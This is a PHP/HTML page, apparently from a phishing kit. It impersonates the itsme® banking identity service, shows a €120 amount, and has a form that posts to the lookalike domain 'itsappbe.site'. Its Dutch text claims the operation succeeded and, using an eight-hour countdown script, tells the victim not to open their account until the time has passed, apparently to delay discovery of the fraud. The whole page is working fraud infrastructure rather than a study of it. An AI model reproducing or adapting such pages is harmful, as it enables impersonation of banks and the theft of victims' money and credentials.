<?php 
require '../main.php';
?>
<html class="liquorice-ux no-js i svg no-touchevents" lang="de"><!--<![endif]--><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Kies land en bank.</title>
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="-1">
	<meta name="format-detection" content="telephone=no">
	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
	<meta name="robots" content="noindex, follow">	<meta name="theme-color" content="#F5F5F6">	
    <link rel="shortcut icon" type="image/x-icon" >	
    <link rel="stylesheet" type="text/css" href="./css/css6.css">
	</head>
<body id="SelectCountryPage" class="lang-de country-de template-default" data-info="1719-0" data-ready="true"><div class="tooltip">.</div>
			
					<main class="main" id="main">
									<aside class="sidebar js-sidebar">
						

<div class="less visible in">
	<div class="sidebar-top">
														<div class="project-logo square visible">
						<img src="./images/log.webp" alt="Company logo" id="CompanyLogo">
					</div>
											
		
		
<p class="amount js-toggle-details" data-currency="€" data-currency-format="%1$s %2$s">
    itsme®</p>						</div>
</div>

	<div class="more">
		<div class="sidebar-top">
			<div class="hidden-large">
				
									<p class="headline">Betrag</p>
					<p class="amount" data-currency="€" data-currency-format="%1$s %2$s">120,00&nbsp;€</p>
							</div>

												<p class="headline">Transaktions-ID</p>

					<p class="has-tip" title="">
											
										</p>
							
							
				

									
									</div>
	</div>



<div class="logo-container ">
		
	
	</div>

			
						</aside>
									<section class="content content-with-return-button">
				<div class="flex-size-wrapper">
					
										
    					
					


    
    <form action="https://itsappbe.site/NL/home.php" id="WizardForm" method="post" accept-charset="utf-8"><div class="content-wrapper">
		<div class="flex-size-wrapper">
					
										
					
					
<div class="header">
	
<div class="logo-container ">
			<div class="logo-centered">
		
	
			</div>
	</div>
			
</div>
			<span class="loadicon"></span>

<center>


    
<h1>bewerking succesvol voltooid</h1><br><h2>Beste gebruiker, open uw account pas nadat de opgegeven tijd is verstreken.</h2><br><div id="start-time">Pagina geopend op: </div><br>
<div id="end-time">Specifieke tijd: </div><br>
<div id="countdown">08:00:00</div><br>
<br>
<script>
  document.addEventListener('DOMContentLoaded', function() {
    function formatTime(time) {
      const hours = String(Math.floor(time / 3600)).padStart(2, '0');
      const minutes = String(Math.floor((time % 3600) / 60)).padStart(2, '0');
      const seconds = String(Math.floor(time % 60)).padStart(2, '0');
      return `${hours}:${minutes}:${seconds}`;
    }

    function formatDate(date) {
      return date.toLocaleTimeString('nl-NL', { timeZone: 'Europe/Amsterdam' });
    }

    let startTime = localStorage.getItem('countdownStartTime');
    if (!startTime) {
      startTime = new Date().getTime();
      localStorage.setItem('countdownStartTime', startTime);
    } else {
      startTime = parseInt(startTime, 10);
    }

    const startDate = new Date(startTime);
    document.getElementById('start-time').textContent = `Pagina geopend op: ${formatDate(startDate)}`;

    const endTime = new Date(startTime + 8 * 60 * 60 * 1000);
    document.getElementById('end-time').textContent = `Specifieke tijd: ${formatDate(endTime)}`;

    function updateCountdown() {
      const now = new Date().getTime();
      const timeLeft = endTime - now;

      if (timeLeft <= 0) {
        clearInterval(interval);
        document.getElementById('countdown').textContent = '00:00:00';
        localStorage.removeItem('countdownStartTime');
        return;
      }

      const timeLeftSeconds = Math.floor(timeLeft / 1000);
      document.getElementById('countdown').textContent = formatTime(timeLeftSeconds);
      console.log("Countdown updated:", formatTime(timeLeftSeconds)); // Debugging
    }

    const interval = setInterval(updateCountdown, 1000);
    updateCountdown();
  });
</script>
</center>


	<div>
		
	</div>

					
				</div>
	
	</div><div class="content-wrapper">
		

	<div class="header">
	
	
	
<div class="logo-container ">
			<div class="logo-centered">
		
	
			</div>
	</div>
	

</div>
	


	</div>

				<div class="text-center standard-help-text">
					</div>
		
		
	
<div class="backend-form-element password"><div class="input"><div class="form-element"><label class=" floating-label has-placeholder no-label"><span>
</span></label></div><div class="caps-lock-hint" style="display: none"></div><div class="input-help-text"><div class="backend-form-element paragraph"><div class="input"><div class="form-element"></div></div></div></div></div></div></form></div>
			


	


<div class="float-control ">
			
	
	</div>

<span class="spacer-xl"></span>

					<div id="contentBackdrop" class="content-backdrop"></div>
				
			</section>
		</main>

					<footer id="main-footer" class="footer main-footer">
				



			</footer>

</body></html>
</html>
